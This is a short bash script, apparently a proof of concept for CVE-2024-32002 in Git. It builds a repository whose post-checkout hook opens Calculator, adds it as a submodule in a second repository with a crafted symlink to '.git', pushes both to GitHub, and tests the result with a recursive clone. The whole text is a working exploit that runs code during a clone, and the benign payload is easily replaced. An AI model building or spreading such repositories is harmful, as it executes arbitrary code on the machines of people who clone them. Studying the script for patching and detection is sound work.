



```bash
#!/bin/bash

git init hook
cd hook
mkdir -p y/hooks
cat > y/hooks/post-checkout <<EOF
#!/bin/bash
open -a Calculator.app
EOF


chmod +x y/hooks/post-checkout

git add y/hooks/post-checkout
git commit -m "post-checkout"
git remote add origin git@github.com:bfengj/CVE-2024-32002-hook.git
git push -u origin main

cd ..


git init exploit
cd exploit
git submodule add --name x/y git@github.com:bfengj/CVE-2024-32002-hook.git A/modules/x
git commit -m "add-submodule"

# 创建符号链接
printf ".git" > dotgit.txt
git hash-object -w --stdin < dotgit.txt > dot-git.hash
printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
git update-index --index-info < index.info
git commit -m "add-symlink"
git remote add origin git@github.com:bfengj/CVE-2024-32002-Exploit.git
git push -u origin main
cd ..

#测试
git clone --recursive git@github.com:bfengj/CVE-2024-32002-Exploit.git exploited
```

